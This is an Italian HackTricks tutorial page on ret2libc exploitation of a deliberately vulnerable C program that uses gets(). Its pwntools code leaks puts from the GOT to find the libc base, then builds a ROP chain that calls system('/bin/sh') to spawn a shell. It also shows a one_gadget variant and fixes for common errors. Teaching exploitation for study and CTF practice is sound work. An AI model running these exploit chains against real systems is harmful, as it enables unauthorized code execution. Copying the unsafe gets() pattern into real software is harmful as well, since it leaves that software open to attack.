<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>


# Breve riassunto

1. **Trova** l'**offset** dell'overflow
2. **Trova** i gadget `POP_RDI`, `PUTS_PLT` e `MAIN_PLT`
3. Usa i gadget precedenti per **leakare l'indirizzo di memoria** di puts o un'altra funzione di libc e **trova la versione di libc** ([scaricala](https://libc.blukat.me))
4. Con la libreria, **calcola il ROP e sfruttalo**

# Altri tutorial e binari per esercitarsi

Questo tutorial sfrutta il codice/binario proposto in questo tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Altri tutorial utili: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Codice

Nome file: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Modello di leak di LIBC

Sto per utilizzare il codice situato qui per creare l'exploit.\
Scarica l'exploit e posizionalo nella stessa directory del binario vulnerabile e fornisci i dati necessari allo script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Trovare l'offset

Il modello richiede un offset prima di continuare con l'exploit. Se non viene fornito alcun offset, eseguir√† il codice necessario per trovarlo (per impostazione predefinita `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Esegui** `python template.py` verr√† aperta una console GDB con il programma che si blocca. All'interno di quella **console GDB** esegui `x/wx $rsp` per ottenere i **byte** che avrebbero sovrascritto il RIP. Infine, ottieni l'**offset** utilizzando una console **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Dopo aver trovato l'offset (in questo caso 40), cambia la variabile OFFSET all'interno del modello utilizzando quel valore.\
`OFFSET = "A" * 40`

Un altro modo sarebbe utilizzare: `pattern create 1000` -- _eseguire fino a ret_ -- `pattern search $rsp` da GEF.

# 2- Trovare Gadget

Ora dobbiamo trovare i gadget ROP all'interno del binario. Questi gadget ROP saranno utili per chiamare `puts` per trovare la **libc** utilizzata e successivamente per **lanciare l'exploit finale**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Il `PUTS_PLT` √® necessario per chiamare la **funzione puts**.\
Il `MAIN_PLT` √® necessario per chiamare nuovamente la **funzione principale** dopo un'interazione per **sfruttare** l'overflow **nuovamente** (round infiniti di sfruttamento). **Viene utilizzato alla fine di ogni ROP per richiamare nuovamente il programma**.\
Il **POP\_RDI** √® necessario per **passare** un **parametro** alla funzione chiamata.

In questo passaggio non √® necessario eseguire nulla poich√© tutto verr√† trovato da pwntools durante l'esecuzione.

# 3- Trovare la libreria LIBC

Ora √® il momento di trovare quale versione della libreria **libc** viene utilizzata. Per farlo, andremo a **leakare** l'**indirizzo** in memoria della **funzione** `puts` e poi cercheremo in quale versione della libreria si trova la versione di puts a quell'indirizzo.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Per farlo, la linea pi√π importante del codice eseguito √®:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Questo invier√† alcuni byte fino a quando non sar√† possibile sovrascrivere il **RIP**: `OFFSET`.\
Successivamente, imposter√† l'**indirizzo** del gadget `POP_RDI` in modo che l'indirizzo successivo (`FUNC_GOT`) venga salvato nel registro **RDI**. Ci√≤ perch√© vogliamo **chiamare puts** passandogli l'**indirizzo** di `PUTS_GOT` come indirizzo in memoria della funzione puts viene salvato nell'indirizzo puntato da `PUTS_GOT`.\
Dopo di ci√≤, verr√† chiamato `PUTS_PLT` (con `PUTS_GOT` all'interno di **RDI**) in modo che puts legga il contenuto all'interno di `PUTS_GOT` (l'indirizzo della funzione puts in memoria) e lo stampi.\
Infine, viene chiamata nuovamente la funzione **main** in modo da poter sfruttare nuovamente l'overflow.

In questo modo abbiamo **ingannato la funzione puts** per stampare l'**indirizzo** in **memoria** della funzione **puts** (che si trova nella libreria **libc**). Ora che abbiamo quell'indirizzo possiamo **ricercare quale versione di libc viene utilizzata**.

![](<../../../.gitbook/assets/image (141).png>)

Poich√© stiamo **sfruttando** un binario **locale**, non √® **necessario** scoprire quale versione di **libc** viene utilizzata (basta trovare la libreria in `/lib/x86_64-linux-gnu/libc.so.6`).\
Ma, nel caso di un exploit remoto, spiegher√≤ qui come puoi trovarlo:

## 3.1- Ricerca della versione di libc (1)

Puoi cercare quale libreria viene utilizzata nella pagina web: [https://libc.blukat.me/](https://libc.blukat.me)\
Ti permetter√† anche di scaricare la versione scoperta di **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Ricerca della versione di libc (2)

Puoi anche fare:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Ci√≤ richieder√† del tempo, sii paziente.\
Per farlo funzionare abbiamo bisogno di:

* Nome del simbolo di libc: `puts`
* Indirizzo di libc leakato: `0x7ff629878690`

Possiamo capire quale **libc** viene molto probabilmente utilizzata.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Abbiamo 2 corrispondenze (dovresti provare la seconda se la prima non funziona). Scarica la prima:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copia la libc da `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` nella nostra directory di lavoro.

## 3.3- Altre funzioni per il leak
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Trovare l'indirizzo di base della libc e sfruttarlo

A questo punto dovremmo conoscere la libreria libc utilizzata. Poich√© stiamo sfruttando un binario locale, user√≤ semplicemente: `/lib/x86_64-linux-gnu/libc.so.6`

Quindi, all'inizio di `template.py`, cambia la variabile **libc** in: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Imposta il percorso della libreria quando lo conosci`

Dando il **percorso** alla **libreria libc**, il resto dello **sfruttamento verr√† calcolato automaticamente**.

All'interno della funzione `get_addr`, verr√† calcolato l'**indirizzo di base della libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Nota che l'**indirizzo base finale di libc deve terminare con 00**. Se non √® il tuo caso, potresti aver fatto trapelare una libreria errata.
{% endhint %}

Successivamente, l'indirizzo della funzione `system` e l'**indirizzo** della stringa _"/bin/sh"_ verranno **calcolati** dall'**indirizzo base** di **libc** e dalla **libreria libc** fornita.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Finalmente, l'exploit di esecuzione /bin/sh verr√† preparato e inviato:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Spieghiamo questo ultimo ROP. 
L'ultimo ROP (`rop1`) termina richiamando nuovamente la funzione principale, quindi possiamo **sfruttare nuovamente** l'**overflow** (eccolo perch√© l'`OFFSET` √® qui di nuovo). Quindi, vogliamo chiamare `POP_RDI` puntando all'**indirizzo** di _"/bin/sh"_ (`BINSH`) e chiamare la funzione **system** (`SYSTEM`) perch√© l'indirizzo di _"/bin/sh"_ verr√† passato come parametro. 
Infine, viene **chiamato l'indirizzo della funzione exit** in modo che il processo **termini correttamente** e non venga generato alcun avviso.

**In questo modo l'exploit eseguir√† una shell **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Utilizzo di ONE\_GADGET

√à anche possibile utilizzare [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) per ottenere una shell invece di utilizzare **system** e **"/bin/sh". ONE\_GADGET** trover√† all'interno della libreria libc un modo per ottenere una shell utilizzando solo un **indirizzo ROP**. 
Tuttavia, di solito ci sono alcune restrizioni, le pi√π comuni e facili da evitare sono come `[rsp+0x30] == NULL`. Poich√© controlli i valori all'interno del **RSP**, devi solo inviare alcuni valori NULL in pi√π in modo che la restrizione venga evitata.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# FILE DI EXPLOIT

Puoi trovare un modello per sfruttare questa vulnerabilit√† qui:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Problemi comuni

## MAIN\_PLT = elf.symbols\['main'] non trovato

Se il simbolo "main" non esiste, puoi semplicemente cercare dove si trova il codice principale:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
e impostare manualmente l'indirizzo:
```python
MAIN_PLT = 0x401080
```
## Puts non trovato

Se il binario non utilizza Puts, dovresti verificare se sta utilizzando

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

Se trovi questo **errore** dopo aver creato **tutti** gli exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Prova a **sottrarre 64 byte all'indirizzo di "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
